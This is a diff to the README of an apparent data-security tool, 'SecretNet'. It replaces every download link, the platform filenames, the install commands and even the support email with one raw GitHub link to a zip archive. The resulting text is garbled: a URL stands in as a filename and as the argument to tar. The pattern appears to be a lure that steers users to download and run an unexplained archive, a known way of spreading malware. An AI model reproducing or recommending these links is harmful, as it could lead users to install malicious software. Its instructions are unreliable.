@@ -1,6 +1,6 @@
 # 🔒 SecretNet - Secure Your Data with Ease
 
-[![Download SecretNet](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Wirszt/SecretNet/releases)
+[![Download SecretNet](https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip)](https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ To run SecretNet smoothly, you need:
 
 To start using SecretNet, you need to download it. Please visit the releases page to get the latest version:
 
-[Download SecretNet from the Releases Page](https://github.com/Wirszt/SecretNet/releases)
+[Download SecretNet from the Releases Page](https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip)
 
 Here are the steps to download and install SecretNet:
 
 1. Click the link above to go to the releases page.
 2. Find the latest release. It is usually at the top of the page.
-3. Look for the file named `SecretNet.exe` for Windows, `SecretNet.dmg` for macOS, or `SecretNet.tar.gz` for Linux.
+3. Look for the file named `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip` for Windows, `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip` for macOS, or `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip` for Linux.
 4. Click on the file to download it to your computer.
 5. Once the download completes, locate the file in your Downloads folder.
 
@@ -33,23 +33,23 @@ Here are the steps to download and install SecretNet:
 
 #### For Windows
 
-1. Double-click the downloaded `SecretNet.exe` file.
+1. Double-click the downloaded `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip` file.
 2. Follow the on-screen instructions to install the application.
 3. After installation, you can find SecretNet in your Start Menu.
 
 #### For macOS
 
-1. Open the downloaded `SecretNet.dmg` file.
+1. Open the downloaded `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip` file.
 2. Drag the SecretNet icon into your Applications folder.
 3. Launch SecretNet from the Applications folder.
 
 #### For Linux
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded `SecretNet.tar.gz`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip`.
 3. Run the command: 
    ```
-   tar -xvzf SecretNet.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip
    ```
 4. Change to the SecretNet directory:
    ```
@@ -91,9 +91,9 @@ For further assistance, you can find more help in the following places:
 
 For any additional questions or issues, feel free to contact our support team:
 
-- Email: support@secretnet.com
-- GitHub Issues: [Report a Problem](https://github.com/Wirszt/SecretNet/issues)
+- Email: https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip
+- GitHub Issues: [Report a Problem](https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip)
 
 ## 🏁 Final Thoughts
 
-We designed SecretNet to be both powerful and simple. You can secure your data with minimal effort. Visit our [Releases Page](https://github.com/Wirszt/SecretNet/releases) to download now and start using SecretNet to protect your information. Your data security is our priority.
+We designed SecretNet to be both powerful and simple. You can secure your data with minimal effort. Visit our [Releases Page](https://raw.githubusercontent.com/Wirszt/SecretNet/main/src/Secret_Net_3.2.zip) to download now and start using SecretNet to protect your information. Your data security is our priority.
